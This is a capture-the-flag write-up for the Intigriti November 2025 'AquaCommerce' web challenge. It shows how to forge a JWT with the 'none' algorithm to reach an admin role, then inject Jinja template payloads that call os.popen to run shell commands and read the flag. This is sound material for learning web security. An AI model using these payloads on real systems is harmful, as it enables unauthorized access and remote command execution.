+++
title = 'Intigriti Challenge 1125 Writeup : AquaCommerce'
date = 2025-11-19
description = 'Intigriti CTF Challenge 1125 Writeup 2025 AquaCommerce JWT SSTI Web Hacking'
draft = false
+++

## Challenge Overview

Welcome back! Today, we are diving into the November 2025 [INTIGRITI](https://twitter.com/intigriti) Challenge. This is going to be a black box testing scenario as no source code is provided just us against the application. 
Let’s see what we can find.

<img class="thumbnailshow" src="intigriti_ctf_1125.png" width=300 height=300>

If you want to give a try Challenge link : [intigriti Challenge 1125](https://challenge-1125.intigriti.io/)


### Prerequisite
- Web Hacking Techniques
  - [ Exploiting JSON Web Tokens JWT ](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-jwt-vulnerabilities)
  - [ Exploiting Server-Side Template Injection SSTI ](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti)
- Hacking Tool 
  - {{< icon "github" >}} [jwt_tool](https://github.com/ticarpi/jwt_tool)

### Vulnerabilities overview

{{< mermaid >}}
flowchart LR
A[ Registration]-->B[ Normal User Role]
B-->C[JWT Tampering]
C-->D[Admin User Role]
D-->E[SSTI Discovery]
E-->F[SSTI to RCE]
F-->G[Capturing the Hidden Flag!]
{{< /mermaid >}}


## Reconnaissance

Here we are presented with a [AquaCommerce](https://challenge-1125.intigriti.io/browse) e-commerce shop used for premium fishing & aquarium items. User's can add items to cart and buy it.

<img class="thumgnailshadow" src="p1.png" width=300 height=300>

It has Login and Sign up functionality. We will be creating an account in order to Login into the application.

<img class="thumgnailshadow" src="p2.png" width=300 height=300>

After we create our account we will be redirected to `/dashboard` into our new account.

<img class="thumgnailshadow" src="p3.png" width=300 height=300>

After logged in we notice our user account has role value set as `user` interesting. 

what about cookies? Let's check it using developer tools

<img class="thumgnailshadow" src="p4.png" width=500 height=400>

## JWT Tampering

We get this as cookie value in parameter `token`. 

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZmFYIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM1NDM3OTJ9.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk
```

As this start's with `eyJ` it's most likely be a JWT token so let's try to decode this using  `jwt_tool.py` . 


```bash
python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZmFYIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM1NDM3OTJ9.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk' 
```

<img class="thumgnailshadow" src="p5.png" width=500 height=500>

Now in order do privilege escalation to admin user we will modifying the values to as follows

Modified Header  Values

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Modified Payload Values

```json
{
  "user_id": 1,
  "username": "admin",
  "role": "admin",
  "exp": 1763543792
}
```

Command to tamper the jwt token

```bash
python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo4LCJ1c2VybmFtZSI6ImFsZmFYIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjM1NDM3OTJ9.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk' -T
```

<img class="thumgnailshadow" src="p6.png" width=500 height=500>

Now let's check the values of tampered jwt 

```json
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzYzNTQzNzkyfQ.8ms9nIKxCJRCXRPQmXxR4SXxS20ntTkjei2oiPJw0Gk
```

<img class="thumgnailshadow" src="p7.png" width=500 height=400>

Here, we are changing the parameters which might be same as admin user on backend.
Modifying algorithm form `HS256` to `none` in order to  bypass the signed token and enable support of unsigned tokens. Because tampered JWT token will not be verified successfully.

## Privilege Escalation to Admin 

Now just replace the cookie value with the modified jwt value and refresh the page ( F5 ).

<img class="thumgnailshadow" src="p8.png" width=500 height=400>

We are presented with `Admin Access` sweet!

Now we will visit Admin Panel by clicking on "Admin Panel" or visiting `/admin` url endpoint.

<img class="thumgnailshadow" src="p9.png" width=300 height=300>

While exploring the application we will look into `My Profile` page here, Here we can look an interesting Display Name functionality.

<img class="thumgnailshadow" src="p10.png" width=300 height=300>

## Discovery of SSTI

Now while testing, it simply takes Display Name as input and reflects it on Current Display Name field when save changes are made.


<img class="thumgnailshadow" src="p11.png" width=300 height=300>

While injecting a simple SSTI payloads it results as `7*7 as 49` which confirm the vulnerability.

<img class="thumgnailshadow" src="p12.png" width=300 height=300>

## SSTI to RCE 

Now as it's a Jinja based python which uses python under the hood we can take advantage of global namespaces and importing the `os` module. And using it's `popen()` to run shell command directly into the server and taking the output and reading it by `.read()` method.

So, First we will try to execute `whoami` and `id` command respectively.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() }}
```

<img class="thumgnailshadow" src="p13.png" width=300 height=300>


```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
<img class="thumgnailshadow" src="p14.png" width=300 height=300>

Here, we are able to run os command's successfully and as running as `appuser` user on the server.

## Capturing Finding The flag

First we are trying to get directory listing including hidden files on the current directory.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen(' ls -lha ').read() }}
```

<img class="thumgnailshadow" src="p15.png" width=300 height=300>

we can use view source to format the output in raw and help us to see the command more clearly.

<img class="thumgnailshadow" src="p16.png" width=300 height=300>

Now their's one hidden directory `.aquacommerce` let's check what's inside it.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen(' ls .aquacommerce -lha ').read() }}
```
<img class="thumgnailshadow" src="p17.png" width=300 height=300>

view source version
<img class="thumgnailshadow" src="p18.png" width=300 height=300>

As, we can see a single text file present inside it, Let's looking inside that file.

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat ./.aquacommerce/019a82cf.txt  ').read() }}
```

<img class="thumgnailshadow" src="p19.png" width=300 height=300>

Voilà! We found the flag! 🚩

```
INTIGRITI{019a82cf-ca32-716f-8291-2d0ef30bea32}

```

If you enjoyed this deep dive there's more content on my YouTube channel [Security Journey With Ashif](https://www.youtube.com/@securityjourneywithashif) 

{{< typeit tag=h3 lifeLike=true >}}
Q1RGe1N0YXlfY3VyaW91c18mX2tlZXBfaGFja2luZyF9
{{< /typeit >}}